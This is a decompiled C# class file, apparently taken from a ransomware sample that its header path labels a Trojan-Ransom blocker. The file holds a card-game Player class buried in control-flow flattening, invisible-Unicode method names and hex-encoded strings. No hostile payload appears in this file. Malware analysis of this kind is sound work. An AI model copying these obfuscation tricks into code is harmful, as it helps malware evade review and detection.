// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: CORINFOEHCLAU, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 6CA1C166-25B8-418F-B14D-0C0D6D66CCB2
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-d9c043de55bafb7aba07942d6de18a86edfe7c52f87ce7a8c852068014a73ab2.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
      string str1 = (string) null;
label_1:
      int num1 = -1414935240;
      bool flag1;
      string str2;
      bool flag2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1152202113)) % 12U)
        {
          case 0:
            str2 = str1;
            num1 = -1397295922;
            continue;
          case 1:
            num1 = (int) num2 * 971114395 ^ -802384584;
            continue;
          case 2:
            str1 = "4173796D6D65747269635369676E6174757265466F726D617474";
            num1 = (int) num2 * -846141897 ^ -839291571;
            continue;
          case 3:
            flag1 = BaseStream == 0;
            num1 = (int) num2 * 599495811 ^ 592935542;
            continue;
          case 4:
            int num3 = flag1 ? -1911621291 : (num3 = -1355284940);
            num1 = num3 ^ (int) num2 * 101285122;
            continue;
          case 5:
            int num4 = flag2 ? -279474463 : (num4 = -774706797);
            num1 = num4 ^ (int) num2 * 183393408;
            continue;
          case 6:
            str1 = "4276434766";
            num1 = (int) num2 * -1555327025 ^ 1295514514;
            continue;
          case 7:
            flag2 = BaseStream == 1;
            num1 = -1739769502;
            continue;
          case 9:
            goto label_1;
          case 10:
            num1 = (int) num2 * 1439735400 ^ 1289193677;
            continue;
          case 11:
            num1 = (int) num2 * 329006835 ^ -2087608390;
            continue;
          default:
            goto label_13;
        }
      }
label_13:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
      if (this.PlanningCards.Length != 0)
        goto label_4;
label_1:
      int num1 = 706606659;
label_2:
      uint num2;
      int num3;
      int num4;
      switch ((num2 = (uint) (num1 ^ 1171099293)) % 3U)
      {
        case 0:
          goto label_1;
        case 1:
          num4 = 0;
          goto label_5;
        default:
          return num3;
      }
label_4:
      num4 = this.PlanningCards[cardTypeIndex];
label_5:
      num3 = num4;
      num1 = 2095031722;
      goto label_2;
    }

    public int PlanningCardsCount
    {
      get
      {
label_1:
        int num1 = -618103639;
        int num2;
        int[] planningCards;
        int index;
        bool flag;
        int planningCardsCount;
        while (true)
        {
          uint num3;
          switch ((num3 = (uint) (num1 ^ -483701804)) % 13U)
          {
            case 0:
              num1 = (int) num3 * -615858570 ^ -2001944529;
              continue;
            case 1:
              ++index;
              num1 = (int) num3 * 2123468862 ^ -1335426691;
              continue;
            case 2:
              planningCardsCount = num2;
              num1 = (int) num3 * -1555512396 ^ 978255926;
              continue;
            case 3:
              goto label_1;
            case 4:
              planningCards = this.PlanningCards;
              index = 0;
              num1 = (int) num3 * 863659544 ^ -2125575271;
              continue;
            case 5:
              num1 = (int) num3 * 548489820 ^ -81076060;
              continue;
            case 7:
              int num4;
              num1 = num4 = index < planningCards.Length ? -98680965 : (num4 = -863443739);
              continue;
            case 8:
              int num5 = flag ? -1446184776 : (num5 = -1887264735);
              num1 = num5 ^ (int) num3 * -1291284975;
              continue;
            case 9:
              num2 = 0;
              num1 = (int) num3 * 1178424267 ^ 1331150979;
              continue;
            case 10:
              ++num2;
              num1 = (int) num3 * 1678878991 ^ 2131517603;
              continue;
            case 11:
              num1 = -1621369666;
              continue;
            case 12:
              flag = planningCards[index] > 0;
              num1 = -25642791;
              continue;
            default:
              goto label_14;
          }
        }
label_14:
        return planningCardsCount;
      }
    }

    private Player()
    {
label_1:
      int num1 = 133613413;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1779325276)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            num1 = (int) num2 * -1985885956 ^ 1430292678;
            continue;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public string PlanningCardsToString()
    {
      string str1 = " ";
label_1:
      int num1 = 669995495;
      int index;
      int planningCard;
      bool flag1;
      string str2;
      bool flag2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 2111392278)) % 13U)
        {
          case 0:
            str2 = str1;
            num1 = (int) num2 * 1518059170 ^ -1508620044;
            continue;
          case 1:
            str1 = Player.\u202E‮​‪⁭‪⁪‏‭‪⁭‏⁫‏⁮‏‫‫‭⁪⁮⁯‎‬‮​​‌​⁯⁪‏⁪‍‏‪‬‮⁪‪‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = 1459036175;
            continue;
          case 2:
            goto label_1;
          case 3:
            num1 = (int) num2 * -698535272 ^ 349473420;
            continue;
          case 4:
            num1 = (int) num2 * 114218148 ^ 1260921468;
            continue;
          case 5:
            int num3 = flag2 ? -1714741652 : (num3 = -958861561);
            num1 = num3 ^ (int) num2 * 1706816518;
            continue;
          case 6:
            int num4 = !flag1 ? -149405391 : (num4 = -178710280);
            num1 = num4 ^ (int) num2 * -63123914;
            continue;
          case 8:
            index = 0;
            num1 = (int) num2 * -1329051600 ^ -468875261;
            continue;
          case 9:
            flag2 = index < this.PlanningCards.Length;
            num1 = 129824273;
            continue;
          case 10:
            ++index;
            num1 = 1111788851;
            continue;
          case 11:
            planningCard = this.PlanningCards[index];
            flag1 = planningCard == 0;
            num1 = (int) num2 * 282356326 ^ 1477124320;
            continue;
          case 12:
            num1 = 773891034;
            continue;
          default:
            goto label_14;
        }
      }
label_14:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
      Player player = new Player()
      {
        Name = json["name"].Value,
        PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
        UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
      };
label_1:
      int num1 = -1736882727;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1606861875)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            num1 = (int) num2 * -980146276 ^ -620709786;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
      int count = json.Count;
label_1:
      int num1 = -1055566000;
      int aIndex;
      int[] numArray;
      bool flag;
      int[] planningCards;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1930547996)) % 10U)
        {
          case 0:
            num1 = (int) num2 * -1089314231 ^ 459869868;
            continue;
          case 1:
            numArray[aIndex] = json[aIndex].AsInt;
            num1 = -807288803;
            continue;
          case 3:
            flag = aIndex < count;
            num1 = -34669715;
            continue;
          case 4:
            goto label_1;
          case 5:
            int num3 = !flag ? 1089820324 : (num3 = 1757840574);
            num1 = num3 ^ (int) num2 * -489811095;
            continue;
          case 6:
            numArray = new int[count];
            aIndex = 0;
            num1 = (int) num2 * -1409259430 ^ 481118988;
            continue;
          case 7:
            ++aIndex;
            num1 = (int) num2 * 1999583858 ^ 231631527;
            continue;
          case 8:
            num1 = (int) num2 * 110273738 ^ -1596008443;
            continue;
          case 9:
            planningCards = numArray;
            num1 = (int) num2 * -2035047331 ^ 2087880961;
            continue;
          default:
            goto label_11;
        }
      }
label_11:
      return planningCards;
    }

    public override string ToString()
    {
      string str = Player.\u200D⁯‌‏‮‭⁫⁪‏‭‬‌⁬⁭‫⁬‎‮‏⁪⁫‪⁫‎‫‌‫​‪‫⁯⁭⁬​⁭⁮⁯⁭‭⁯‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
label_1:
      int num1 = -229930073;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1061863431)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            num1 = (int) num2 * 1388708806 ^ -561015946;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    static string \u202E‮​‪⁭‪⁪‏‭‪⁭‏⁫‏⁮‏‫‫‭⁪⁮⁯‎‬‮​​‌​⁯⁪‏⁪‍‏‪‬‮⁪‪‮([In] string[] obj0) => string.Concat(obj0);

    static string \u200D⁯‌‏‮‭⁫⁪‏‭‬‌⁬⁭‫⁬‎‮‏⁪⁫‪⁫‎‫‌‫​‪‫⁯⁭⁬​⁭⁮⁯⁭‭⁯‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
